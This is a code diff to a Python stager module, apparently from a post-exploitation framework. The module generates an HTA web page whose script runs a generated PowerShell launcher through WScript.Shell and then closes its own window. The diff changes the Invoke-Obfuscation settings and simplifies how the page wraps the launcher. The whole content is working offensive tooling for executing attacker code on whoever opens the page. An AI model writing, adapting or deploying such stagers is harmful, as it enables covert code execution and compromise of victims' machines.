@@ -53,7 +53,7 @@ class Stager:
             'ObfuscateCommand' : {
                 'Description'   :   'The Invoke-Obfuscation command to use. Only used if Obfuscate switch is True. For powershell only.',
                 'Required'      :   False,
-                'Value'         :   r'Token\All\1,Launcher\PS\23567'
+                'Value'         :   r'Token\All\1,Launcher\STDIN++\123467'
             },
             'UserAgent' : {
                 'Description'   :   'User-agent string to use for the staging request (default, none, or other).',
@@ -111,13 +111,8 @@ class Stager:
             print helpers.color("[!] Error in launcher command generation.")
             return ""
         else:
-            code = ""
-            if obfuscate:
-                code = "<html><head><script>var c= 'powershell -noP -sta -w 1 \""
-                code += launcher.replace("'", "\\'").replace('"', '\\"') + "\"'\n"
-            else:
-                code = "<html><head><script>var c= '"
-                code += launcher.replace("'", "\\'") + "'\n"
+            code = "<html><head><script>var c= '"
+            code += launcher.replace("'", "\\'") + "'\n"
             code += "new ActiveXObject('WScript.Shell').Run(c);</script></head><body><script>self.close();</script></body></html>"
             
         return code
